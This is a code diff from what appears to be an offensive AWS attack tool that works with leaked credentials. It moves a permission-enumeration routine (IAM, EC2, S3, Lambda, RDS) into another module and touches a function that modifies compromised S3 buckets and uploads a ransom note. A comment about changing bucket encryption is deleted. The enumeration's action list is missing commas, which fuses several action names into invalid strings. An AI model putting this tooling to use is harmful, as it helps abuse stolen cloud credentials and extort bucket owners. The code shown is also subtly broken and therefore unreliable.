@@ -17,69 +17,9 @@ import base64
 import boto3
 import botocore
 from logger import get_logger
+from enumeration import enumerate_services
 
 logger = get_logger("enumerations_n_s3_access")
-
-def enumerate_services() -> boto3.client | bool:
-    """
-    enumerate few services to check if they are available
-    Return: None; it only checks if specific service call is
-    allowed using the leaked credentials
-    """
-
-    active_clients = {}
-    given_actions = [
-        "iam:ListRoles"
-        "iam:ListUsers"
-        "iam:GetUser"
-        "iam:CreateRole"
-        "iam:AttachRolePolicy",
-        "ec2:DescribeInstances"
-        "ec2:DescribeRegions"
-        "ec2:RunInstances"
-        "ec2:TerminateInstances",
-        "s3:ListBuckets"
-        "s3:GetObject"
-        "s3:PutObject"
-        "s3:ListAllMyBuckets",
-        "lambda:ListFunctions"
-        "lambda:InvokeFunction"
-        "lambda:CreateFunction",
-        "rds:DescribeDBInstances"
-        "rds:DescribeDBClusters"
-    ]
-
-    # enumerate services
-    # iam-list-users
-    try:
-        iam_client = boto3.client("iam")
-        sts = boto3.client("sts")
-
-        user_data = sts.get_caller_identity()
-        user_arn = user_data.get("Arn")
-
-        actions_decisions = iam_client.simulate_principal_policy(
-            PolicySourceArn=user_arn,
-            ActionNames=given_actions,
-            ResourceArns=["*"]
-        )
-
-        if actions_decisions.get("EvaluationResults"):
-            for each_action in actions_decisions.get("EvaluationResults"):
-                service_name = each_action.get("EvalActionName").split(':', 1)[0]
-                if each_action.get("EvalDecision").lower() == "allowed":
-                    active_clients[service_name] = boto3.client(service_name, region_name="ap-south-1")
-                    logger.info(f"service {service_name} is working")
-                else:
-                    logger.error(f"service {service_name} is not working")
-        
-        # check if any of the above enumeration worked or not, if yes return True or False
-        if active_clients:
-            logger.info(f"active clients: \n{active_clients}")
-            return active_clients
-        return False
-    except Exception as err:
-        logger.error(err.__str__())
 
 def modify_s3_buckets(
     s3_client: boto3.client,
@@ -184,18 +124,8 @@ def modify_s3_buckets(
             logger.info("ransom text uploaded successfully")
         else:
             logger.error("something went wrong while uploading ransom text")
-
-        # task6: try updating encryption configuration of a compromised bucket
-        # check what default configuration is been in-use (SSE-s3 - by default)
-        #resp = s3_client.get_bucket_encryption(Bucket=bucket.get("Name"))
-        #if resp.get("ResponseMetadata", {}).get("HTTPStatusCode") == 200:
-        #    logger.info(
-        #        f"Bucket encyrption conf: {resp.get("ServerSideEncryptionConfiguration")}"
-        #    )
-
-        # TODO: put a bucket encryption
     except Exception as err:
-        raise Exception(err.__str__())
+        logger.error(err.__str__())
 
 
 def attack_s3():
